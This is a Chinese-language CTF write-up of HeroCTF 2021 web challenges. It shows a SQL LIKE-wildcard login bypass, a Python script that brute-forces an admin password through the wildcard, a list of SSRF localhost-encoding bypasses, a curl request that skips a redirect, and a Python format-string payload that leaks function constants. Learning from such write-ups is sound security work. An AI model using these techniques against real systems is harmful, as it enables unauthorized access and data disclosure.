---
title: HeroCTF(web)
categories: 赛题wp
---

# PwnQL #1
- 考点：sql语句 LIKE 通配符

进入网页：

![](https://img-blog.csdnimg.cn/20210427194910722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

<!--more-->
查看源码：

![](https://img-blog.csdnimg.cn/20210427194931494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

下载备份文件：

login.php
```php
<?php

require_once(__DIR__  . "/config.php");

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT * FROM users WHERE username = :username AND password LIKE :password;";
    $sth = $db->prepare($sql, array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY));
    $sth->execute(array(':username' => $username, ':password' => $password));
    $users = $sth->fetchAll();

    if (count($users) === 1) {
        $msg = 'Welcome back admin ! Here is your flag : ' . FLAG;
    } else {
        $msg = 'Wrong username or password.';
    }
}
```

注意到LIKE：
```
$sql = "SELECT * FROM users WHERE username = :username AND password LIKE :password;";
```

![](https://img-blog.csdnimg.cn/20210427195109368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
不仅有 `%` 还有 `_` 
```
%:匹配任何长度>=0的字符串， _ : 匹配任何字符
```

admin /  %  登录即可

---
# PwnQL #2
- 脚本

这道题让得到admin的密码

那就(`爆破字符+%通配一下`)，如果那个字符正确则返回上题flag

脚本：
```python
import requests
from string import digits, ascii_letters

flag = ''
characters = [i for i in digits + ascii_letters] + \
             ['\_', '!', '#', '@', '$', '}', '{', '|', '^', '&', '*', '(', ')', '-', '+', '=', '[', ']', '<', '>', '?',
              '`', ',', '.', 'END']

while flag == '' or i != 'END':
    for i in characters:
        flag_candidate = flag + i
        payload = {
            "username": 'admin',
            "password": flag_candidate + '%'
        }
        r = requests.post('http://chall1.heroctf.fr:8080/index.php', data=payload)
        if b'Hero{pwnQL_b4sic_0ne_129835}' in r.content:
            flag = flag + i
            print(flag)
            break

print('Flag: Hero{{{}}}'.format(flag.replace('\\', '')))

```


---
# 0xSSRF
- 考点：SSRF基础ip绕过

这题看完wp，非常生气，感觉有点吃亏说不出

![](https://img-blog.csdnimg.cn/20210427195655726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
进入网址，点击Get flag

![](https://img-blog.csdnimg.cn/20210427195725852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
提示不是本地ip

那就好说啊，把本地ip换一种形式不就行了吗

```
十六进制
  url=http://0x7F.0.0.1/flag.php

八进制
  url=http://0177.0.0.1/flag.php

10 进制整数格式
  url=http://2130706433/flag.php

16 进制整数格式，还是上面那个网站转换记得前缀0x
  url=http://0x7F000001/flag.php

还有一种特殊的省略模式
  127.0.0.1写成127.1

用CIDR绕过localhost
  url=http://127.127.127.127/flag.php

还有很多方式
  url=http://0/flag.php
  url=http://0.0.0.0/flag.php

  http://0/
  ```

任选一个，排除长度限制，就只剩下 `http://0/flag` 了

结果wp是这样写的：`http://0:3000/flag`

竟然要加端口？？！！

涨知识了

---
# You Should Die

>你能从这家营销公司取回国旗吗？‎

网页源码：

![](https://img-blog.csdnimg.cn/20210427200400915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)

下载的时候，看到 url 与弹窗内容一样：

![](https://img-blog.csdnimg.cn/20210427200501638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)

admin.php
```php
<?php

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

if (!(isset($_SESSION["logged"]) && $_SESSION["logged"] === true)) {
    header("Location: /index.php?error=You are not admin !");
}

echo "Flag : " . getenv("FLAG_MARK3TING");
```

直接前往admin.php

>Here we can see that flag can be accessed under the /admin.php. Code checks if we are logged in an if we are not it redirects us to /index.php. Redirect is a key word here, because we can fetch this address with curl, which ignores Location header.

在这里，我们可以看到可以在下方访问该标志/admin.php。代码检查我们是否登录，如果不是，则将我们重定向到/index.php。重定向是此处的关键词，因为我们可以使用来获取此地址 curl，而忽略Location标头。

payload:
```
curl http://chall1.heroctf.fr:9000/admin.php
```

---
# Black Market
- 考点：Handlebars模板SSTI

>‎一群黑客在深度网络上销售非法服务。这个网站已经造成了很大的破坏，必须停止！‎‎找到控制网络服务器的方法！‎

网页挺炫酷：

![](https://img-blog.csdnimg.cn/2021042720340676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
看到basket是403

![](https://img-blog.csdnimg.cn/20210427205040286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
买完服务后再次回到这里：

![](https://img-blog.csdnimg.cn/20210427205233168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)

抓包这里崩了，没法抓，抓不住，一代理就拒绝访问

贴个wp：https://github.com/MrR3boot/CTF/blob/master/HeroCTF-2021/web/BlackMarket/README.md



---
# ***Magic Render
- 考点：Python格式字符串漏洞+html

先贴两个前置知识：

[从两道CTF实例看python格式化字符串漏洞](https://zhuanlan.zhihu.com/p/57309024)

[Python format string vulnerabilities](https://podalirius.net/articles/python-format-string-vulnerabilities/)


wp: [Magic Render](https://github.com/sambrow/ctf-writeups-2021/tree/master/hero-ctf/magic-render)


进入网址：

说明了没有cookie与管理员，xss就pass了
![](https://img-blog.csdnimg.cn/20210427212221174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)




当随便输入时会返回一个html页面

![](https://img-blog.csdnimg.cn/20210427212508916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
当输入:
```
{{}}
```
报错：
```
Something went wrong, sorry! It's only the alpha version !
```

>Alpha版本的产品的严重缺陷基本完成修正并通过复测，仍然需要完整的功能测试，但是可以满足一般需求。


利用python的格式化字符串测试：

```
{self.__init__.__globals__}
```


![](https://img-blog.csdnimg.cn/20210427214048711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)

请注意，这里有一个secret_function！

起初，我尝试像这样访问它：
```
{self.__init__.__globals__.secret_function}
```

但是找回了错误。最终，我了解到我需要使用方括号，因为这`__globals__`是一本字典。
```
{self.__init__.__globals__[secret_function]}
```
但这只是返回一个空白页。

事后看来，这是有道理的，因为该对象一定不能具有字符串表示形式，否则在我们转储出来时它会向我们显示它__globals__。

如果我尝试调用此函数：
```
{self.__init__.__globals__[secret_function]()}
```
我回来了一个错误。


我从上一页复制了一些示例代码，并对其进行了一些修改，以便可以在本地使用。

```python
import sys

def secret_function():
    flag = 'wow'
    return flag

class TEST():
    def __init__(self):
        self.testValue = 'test'

    def renderHTML(self, templateHTML, text):
        return (templateHTML.format(self=self, text=text))

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage : python3 "+sys.argv[0]+" TEMPLATE CONTENT")
    else :
        a = TEST()
        print(a.renderHTML(sys.argv[1], 'foo'))
```

然后，我可以像这样在本地调用它：
```
python3 crack.py '{self.__init__.__globals__}'
```
并得到以下输出：

![](https://img-blog.csdnimg.cn/20210427220845290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
想知道函数对象中隐藏了什么，我将renderHTML（）方法修改为：
```
    def renderHTML(self, templateHTML, text):
        return dir(self.__init__.__globals__['secret_function'])
 ```
`dir()`方法将转储对象的所有属性。

返回了这个：
```
['__annotations__', '__call__', '__class__', '__closure__', '__code__', '__defaults__',

 '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__',

 '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__',

 '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__',

 '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__',

 '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
```
![](https://img-blog.csdnimg.cn/2021042722104832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
不知道要寻找什么，我尝试了其中的几种，直到偶然发现__code__：
```
    def renderHTML(self, templateHTML, text):
        return dir(self.__init__.__globals__['secret_function'].__code__)
 ```

并得到：
```
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__',

'__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__',

'__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount',

'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars',

'co_kwonlyargcount', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_posonlyargcount', 'co_stacksize',

'co_varnames', 'replace']
```
co_varnames看起来很有趣，所以我尝试了：
```
return self.__init__.__globals__['secret_function'].__code__.co_varnames
```
并得到：
```
('flag',)
```

![](https://img-blog.csdnimg.cn/20210427233301646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
然后我尝试了 `co_consts`：
```
return self.__init__.__globals__['secret_function'].__code__.co_consts
```

并得到：
```
(None, 'wow')
```

所以最终提交
```
{self.__init__.__globals__[secret_function].__code__.co_consts}
```



